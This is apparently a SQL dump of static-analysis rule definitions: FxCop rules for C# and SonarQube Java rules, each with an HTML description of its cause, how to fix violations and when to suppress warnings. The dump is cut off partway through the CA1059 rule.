INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (612, 'CA1701: Resource string compound words should be cased correctly', 'ResourceStringCompoundWordsShouldBeCasedCorrectly', 'CA1701', 'fxcop', '<h2>Cause</h2>
<p>
            A resource string contains a compound word that does not appear to be cased correctly.
</p>
<h2>Rule Description</h2>
<p>
            Each word in the resource string is split into tokens that are based on the casing. Each contiguous two-token combination is checked by the Microsoft spelling checker library. If recognized, the word produces a violation of the rule. Examples of compound words that cause a violation are "CheckSum" and "MultiPart", which should be cased as "Checksum" and "Multipart", respectively. Due to previous common usage, several exceptions are built into the rule, and several single words are flagged, such as "Toolbar" and "Filename", that should be cased as two distinct words. In this example, "ToolBar" and "FileName" would be flagged.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Change the word so that it is cased correctly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if both parts of the compound word are recognized by the spelling dictionary and the intent is to use two words.
            You can also add compound words to a custom dictionary for the spelling checker. Words in the custom dictionary do not cause violations. For more information, see How to: Customize the Code Analysis Dictionary.
</p>
<h2>Related Rules</h2>
<p>


                CA1702: Compound words should be cased correctly




                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>




                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264481.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264481.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812564, 1510817812565, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (613, 'CA2122: Do not indirectly expose methods with link demands', 'DoNotIndirectlyExposeMethodsWithLinkDemands', 'CA2122', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected member has a Link Demands and is called by a member that does not perform any security checks.
</p>
<h2>Rule Description</h2>
<p>
            A link demand checks the permissions of the immediate caller only. If a member X makes no security demands of its callers, and calls code protected by a link demand, a caller without the necessary permission can use X to access the protected member.
</p>
<h2>How to Fix Vsolations</h2>
<p>
            Add a security <code>Data and Modeling in the .NET Framework</code> or link demand to the member so that it no longer provides unsecured access to the link demand-protected member.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            To safely suppress a warning from this rule, you must make sure that your code does not grant its callers access to operations or resources that can be used in a destructive manner.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182303.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182303.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812566, 1510817812566, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (614, 'CA1061: Do not hide base class methods', 'DoNotHideBaseClassMethods', 'CA1061', 'fxcop', '<h2>Cause</h2>
<p>
            A derived type declares a method with the same name and with the same number of parameters as one of its base methods; one or more of the parameters is a base type of the corresponding parameter in the base method; and any remaining parameters have types that are identical to the corresponding parameters in the base method.
</p>
<h2>Rule Description</h2>
<p>
            A method in a base type is hidden by an identically named method in a derived type when the parameter signature of the derived method differs only by types that are more weakly derived than the corresponding types in the parameter signature of the base method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove or rename the method, or change the parameter signature so that the method does not hide the base method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182143.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182143.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812567, 1510817812567, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (625, 'CA1018: Mark attributes with AttributeUsageAttribute', 'MarkAttributesWithAttributeUsage', 'CA1018', 'fxcop', '<h2>Cause</h2>
<p>
            The <code>System.AttributeUsageAttribute</code> attribute is not present on the custom attribute.
</p>
<h2>Rule Description</h2>
<p>
            When you define a custom attribute, mark it by using <code>AttributeUsageAttribute</code> to indicate where in the source code the custom attribute can be applied. The meaning and intended usage of an attribute will determine its valid locations in code. For example, you might define an attribute that identifies the person who is responsible for maintaining and enhancing each type in a library, and that responsibility is always assigned at the type level. In this case, compilers should enable the attribute on classes, enumerations, and interfaces, but should not enable it on methods, events, or properties. Organizational policies and procedures would dictate whether the attribute should be enabled on assemblies.
            The <code>System.AttributeTargets</code> enumeration defines the targets that you can specify for a custom attribute. If you omit <code>AttributeUsageAttribute</code>, your custom attribute will be valid for all targets, as defined by the <code>All</code> value of <code>AttributeTargets</code> enumeration.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, specify targets for the attribute by using <code>AttributeUsageAttribute</code>. See the following example.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You should fix a violation of this rule instead of excluding the message. Even if the attribute inherits <code>AttributeUsageAttribute</code>, the attribute should be present to simplify code maintenance.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DefineAccessorsForAttributeArguments}<br/>




                {rule:fxcop:AvoidUnsealedAttributes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182158.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182158.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812580, 1510817812580, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (615, 'CA2006: Use SafeHandle to encapsulate native resources', 'UseSafeHandleToEncapsulateNativeResources', 'CA2006', 'fxcop', '<h2>Cause</h2>
<p>
            Managed code uses <code>IntPtr</code> to access native resources.
</p>
<h2>Rule Description</h2>
<p>
            Use of <code>IntPtr</code> in managed code might indicate a potential security and reliability problem. All uses of <code>IntPtr</code> must be reviewed to determine whether the use of a <code>SafeHandle</code> , or a similar technology, is required in its place. Problems will occur if the <code>IntPtr</code> represents some native resource, such as memory, a file handle, or a socket, that the managed code is considered to own. If the managed code owns the resource, it must also release the native resources associated with it, because a failure to do so would cause resource leakage.
            In such scenarios, security or reliability problems will also exist if multithreaded access is allowed to the <code>IntPtr</code> and a way of releasing the resource that is represented by the <code>IntPtr</code> is provided. These problems involve recycling of the <code>IntPtr</code> value on resource release while simultaneous use of the resource is being made on another thread. This can cause race conditions where one thread can read or write data that is associated with the wrong resource. For example, if your type stores an OS handle as an <code>IntPtr</code> and allows users to call both Close and any other method that uses that handle simultaneously and without some kind of synchronization, your code has a handle recycling problem.
            This handle recycling problem can cause data corruption and, frequently, a security vulnerability. <code>SafeHandle</code> and its sibling class <code>CriticalHandle</code> provide a mechanism to encapsulate a native handle to a resource so that such threading problems can be avoided. Additionally, you can use <code>SafeHandle</code> and its sibling class <code>CriticalHandle</code> for other threading issues, for example, to carefully control the lifetime of managed objects that contain a copy of the native handle over calls to native methods. In this situation, you can often remove calls to <code>GC.KeepAlive</code>. The performance overhead thay you incur when you use <code>SafeHandle</code> and, to a lesser degree, <code>CriticalHandle</code>, can frequently be reduced through careful design.
</p>
<h2>How to Fix Violations</h2>
<p>
            Convert <code>IntPtr</code> usage to <code>SafeHandle</code> to safely manage access to native resources. See the <code>SafeHandle</code> reference topic for examples.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You should not suppress this warning.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182294.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182294.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '15min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812568, 1510817812568, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (616, 'CA2138: Transparent methods must not call methods with the SuppressUnmanagedCodeSecurity attribute', 'TransparentMethodsMustNotCallSuppressUnmanagedCodeSecurityMethods', 'CA2138', 'fxcop', '<h2>Cause</h2>
<p>
            A security transparent method calls a method that is marked with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires on any transparent method that calls directly into native code, for example, by using a via a P/Invoke (platform invoke) call. P/Invoke and COM interop methods that are marked with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute result in a LinkDemand being done against the calling method. Because security transparent code cannot satisfy LinkDemands, the code also cannot call methods that are marked with the SuppressUnmanagedCodeSecurity attribute, or methods of class that is marked with SuppressUnmanagedCodeSecurity attribute. The method will fail, or the demand will be converted to a full demand.
            Violations of this rule lead to a <code>MethodAccessException</code> in the Level 2 security transparency model, and a full demand for <code>UnmanagedCode</code> in the Level 1 transparency model.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute and mark the method with the <code>SecurityCriticalAttribute</code> or the <code>SecuritySafeCriticalAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997711.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997711.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812569, 1510817812570, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (719, 'String function use should be optimized for single characters', 'S3027', NULL, 'squid', '<p>An <code>indexOf</code> or <code>lastIndexOf</code> call with a single letter <code>String</code> can be made more performant by switching to a
call with a <code>char</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myStr = "Hello World";
// ...
int pos = myStr.indexOf("W");  // Noncompliant
// ...
int otherPos = myStr.lastIndexOf("r"); // Noncompliant
// ...
</pre>
<h2>Compliant Solution</h2>
<pre>
String myStr = "Hello World";
// ...
int pos = myStr.indexOf(''W'');
// ...
int otherPos = myStr.lastIndexOf(''r'');
// ...
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,performance', false, 'HTML', 1510817812711, 1510817812712, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (720, 'Future keywords should not be used as names', 'S1190', NULL, 'squid', '<p>Through Java''s evolution keywords have been added. While code that uses those words as identifiers may be compilable under older versions of Java,
it will not be under modern versions. </p>
<p>Following keywords are marked as invalid identifiers </p>
<table>
  <tbody>
    <tr>
      <th>Keyword</th>
      <th>Added</th>
    </tr>
    <tr>
      <td><code>_</code></td>
      <td>9</td>
    </tr>
    <tr>
      <td><code>enum</code></td>
      <td>5.0</td>
    </tr>
  </tbody>
</table>
<p><code>assert</code> and <code>strictfp</code> are another example of valid identifiers which became keywords in later versions, however as
documented in SONARJAVA-285, it is not easily possible to support parsing of the code for such old versions, therefore they are not supported by this
rule.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething() {
  int enum = 42;            // Noncompliant
  String _ = "";   // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething() {
  int magic = 42;
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'obsolete,pitfall', false, 'HTML', 1510817812712, 1510817812713, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (617, 'CA1049: Types that own native resources should be disposable', 'TypesThatOwnNativeResourcesShouldBeDisposable', 'CA1049', 'fxcop', '<h2>Cause</h2>
<p>
            A type references a <code>System.IntPtr</code> field, a <code>System.UIntPtr</code> field, or a <code>System.Runtime.InteropServices.HandleRef</code> field, but does not implement <code>System.IDisposable</code>.
</p>
<h2>Rule Description</h2>
<p>
            This rule assumes that <code>IntPtr</code>, <code>UIntPtr</code>, and <code>HandleRef</code> fields store pointers to unmanaged resources. Types that allocate unmanaged resources should implement <code>IDisposable</code> to let callers to release those resources on demand and shorten the lifetimes of the objects that hold the resources.
            The recommended design pattern to clean up unmanaged resources is to provide both an implicit and an explicit means to free those resources by using the <code>Object.Finalize</code> method and the <code>IDisposable.Dispose</code> method, respectively. The garbage collector calls the <code>Finalize</code> method of an object at some indeterminate time after the object is determined to be no longer reachable. After <code>Finalize</code> is called, an additional garbage collection is required to free the object. The <code>Dispose</code> method allows the caller to explicitly release resources on demand, earlier than the resources would be released if left to the garbage collector. After it cleans up the unmanaged resources, <code>Dispose</code> should call the <code>GC.SuppressFinalize</code> method to let the garbage collector know that <code>Finalize</code> no longer has to be called; this eliminates the need for the additional garbage collection and shortens the lifetime of the object.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement <code>IDisposable</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the type does not reference an unmanaged resource. Otherwise, do not suppress a warning from this rule because failure to implement <code>IDisposable</code> can cause unmanaged resources to become unavailable or underused.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:CallGCKeepAliveWhenUsingNativeResources}<br/>




                {rule:fxcop:CallGCSuppressFinalizeCorrectly}<br/>




                {rule:fxcop:DisposableTypesShouldDeclareFinalizer}<br/>




                {rule:fxcop:TypesThatOwnDisposableFieldsShouldBeDisposable}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182173.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182173.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812570, 1510817812571, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (618, 'CA1013: Overload operator equals on overloading add and subtract', 'OverloadOperatorEqualsOnOverloadingAddAndSubtract', 'CA1013', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type implements the addition or subtraction operators without implementing the equality operator.
</p>
<h2>Rule Description</h2>
<p>
            When instances of a type can be combined by using operations such as addition and subtraction, you should almost always define equality to return <code>true</code> for any two instances that have the same constituent values.
            You cannot use the default equality operator in an overloaded implementation of the equality operator. Doing so will cause a stack overflow. To implement the equality operator, use the Object.Equals method in your implementation. See the following example.









            <pre>
if (Object.ReferenceEquals(left, null))
    return Object.ReferenceEquals(right, null);
return left.Equals(right);
</pre>











                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the default implementation of the equality operator provides the correct behavior for the type.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182164.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182164.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812572, 1510817812572, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (619, 'CA1721: Property names should not match get methods', 'PropertyNamesShouldNotMatchGetMethods', 'CA1721', 'fxcop', '<h2>Cause</h2>
<p>
            The name of a public or protected member starts with ''Get'' and otherwise matches the name of a public or protected property. For example, a type that contains a method that is named ''GetColor'' and a property that is named ''Color'' violates this rule.
</p>
<h2>Rule Description</h2>
<p>
            Get methods and properties should have names that clearly distinguish their function.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the time that is required to learn a new software library, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Change the name so that it does not match the name of a method that is prefixed with ''Get''.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.





                    Note




                    This warning may be excluded if the Get method is caused by implementing IExtenderProvider interface.




</p>
<h2>Example</h2>
<p>


                {rule:fxcop:UsePropertiesWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182253.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182253.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812573, 1510817812574, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (620, 'CA1048: Do not declare virtual members in sealed types', 'DoNotDeclareVirtualMembersInSealedTypes', 'CA1048', 'fxcop', '<h2>Cause</h2>
<p>
            A public type is sealed and declares a method that is both <code>virtual</code> (<code>Overridable</code> in Visual Basic) and not final. This rule does not report violations for delegate types, which must follow this pattern.
</p>
<h2>Rule Description</h2>
<p>
            Types declare methods as virtual so that inheriting types can override the implementation of the virtual method. By definition, you cannot inherit from a sealed type, making a virtual method on a sealed type meaningless.
            The Visual Basic .NET and C# compilers do not allow types to violate this rule.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the method non-virtual or make the type inheritable.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Leaving the type in its current state can cause maintenance issues and does not provide any benefits.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182140.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182140.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812574, 1510817812575, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (621, 'CA2227: Collection properties should be read only', 'CollectionPropertiesShouldBeReadOnly', 'CA2227', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible writable property is a type that implements <code>System.Collections.ICollection</code>. Arrays, indexers (properties with the name ''Item''), and permission sets are ignored by the rule.
</p>
<h2>Rule Description</h2>
<p>
            A writable collection property allows a user to replace the collection with a completely different collection. A read-only property stops the collection from being replaced but still allows the individual members to be set. If replacing the collection is a goal, the preferred design pattern is to include a method to remove all the elements from the collection and a method to re-populate the collection. See the <code>Clear</code> and <code>AddRange</code> methods of the <code>System.Collections.ArrayList</code> class for an example of this pattern.
            Both binary and XML serialization support read-only properties that are collections. The <code>System.Xml.Serialization.XmlSerializer</code> class has specific requirements for types that implement <code>ICollection</code> and <code>System.Collections.IEnumerable</code> in order to be serializable.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the property read-only and, if the design requires it, add methods to clear and re-populate the collection.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                <code>CA1819: Properties should not return arrays</code>


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182327.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182327.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812575, 1510817812576, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (622, 'CA2109: Review visible event handlers', 'ReviewVisibleEventHandlers', 'CA2109', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected event-handling method was detected.
</p>
<h2>Rule Description</h2>
<p>
            An externally visible event-handling method presents a security issue that requires review.
            Event-handling methods should not be exposed unless absolutely necessary. An event handler, a delegate type, that invokes the exposed method can be added to any event as long as the handler and event signatures match. Events can potentially be raised by any code, and are frequently raised by highly trusted system code in response to user actions such as clicking a button. Adding a security check to an event-handling method does not prevent code from registering an event handler that invokes the method.
            A demand cannot reliably protect a method invoked by an event handler. Security demands help protect code from untrusted callers by examining the callers on the call stack. Code that adds an event handler to an event is not necessarily present on the call stack when the event handler''s methods run. Therefore, the call stack might have only highly trusted callers when the event handler method is invoked. This causes demands made by the event handler method to succeed. Also, the demanded permission might be asserted when the method is invoked. For these reasons, the risk of not fixing a violation of this rule can only be assessed after reviewing the event-handling method. When you review your code, consider the following issues:
            <ul>
              <li>
                Does your event handler perform any operations that are dangerous or exploitable, such as asserting permissions or suppressing unmanaged code permission?
              </li>
              <li>
                What are the security threats to and from your code because it can run at any time with only highly trusted callers on the stack?
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, review the method and evaluate the following:
            <ul>
              <li>
                Can you make the event-handling method non-public?
              </li>
              <li>
                Can you move all dangerous functionality out of the event handler?
              </li>
              <li>
                If a security demand is imposed, can this be accomplished in some other manner?
              </li>
            </ul>
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only after a careful security review to make sure that your code does not pose a security threat.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182312.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182312.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812576, 1510817812577, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (623, 'CA2228: Do not ship unreleased resource formats', 'DoNotShipUnreleasedResourceFormats', 'CA2228', 'fxcop', '<h2>Cause</h2>
<p>
            A resource file was built using a version of the .NET Framework that is not currently supported.
</p>
<h2>Rule Description</h2>
<p>
            Resource files that were built by using pre-release versions of the .NET Framework might not be usable by supported versions of the .NET Framework.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, build the resource using a supported version of the .NET Frameworkk.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182339.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182339.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812578, 1510817812578, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (624, 'CA1020: Avoid namespaces with few types', 'AvoidNamespacesWithFewTypes', 'CA1020', 'fxcop', '<h2>Cause</h2>
<p>
            A namespace other than the global namespace contains fewer than five types.
</p>
<h2>Rule Description</h2>
<p>
            Make sure that each of your namespaces has a logical organization, and that a valid reason exists to put types in a sparsely populated namespace. Namespaces should contain types that are used together in most scenarios. When their applications are mutually exclusive, types should be located in separate namespaces. For example, the <code>System.Web.UI</code> namespace contains types that are used in Web applications, and the <code>System.Windows.Forms</code> namespace contains types that are used in Windows-based applications. Even though both namespaces have types that control aspects of the user interface, these types are not designed for use in the same application. Therefore, they are located in separate namespaces. Careful namespace organization can also be helpful because it increases the discoverability of a feature. By examining the namespace hierarchy, library consumers should be able to locate the types that implement a feature.





                    Note




                    Design-time types and permissions should not be merged into other namespaces to comply with this guideline. These types belong in their own namespaces below your main namespace, and the namespaces should end in <code>.Design</code> and <code>.Permissions</code>, respectively.




</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, try to combine namespaces that contain just a few types into a single namespace.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the namespace does not contain types that are used with the types in your other namespaces.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182130.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182130.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812579, 1510817812579, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (626, 'CA1059: Members should not expose certain concrete types', 'MembersShouldNotExposeCertainConcreteTypes', 'CA1059', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible member is a certain concrete type or exposes certain concrete types through one of its parameters or return value. Currently, this rule reports exposure of the following concrete types:
            <ul>
              <li>
                A type derived from <code>System.Xml.XmlNode</code>.
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            A concrete type is a type that has a complete implementation and therefore can be instantiated. To allow widespread use of the member, replace the concrete type with the suggested interface. This allows the member to accept any type that implements the interface or be used where a type that implements the interface is expected.
            The following table lists the targeted concrete types and their suggested replacements.







                    Concrete type


                    Replacement






                        <code>XPathDocument</code>






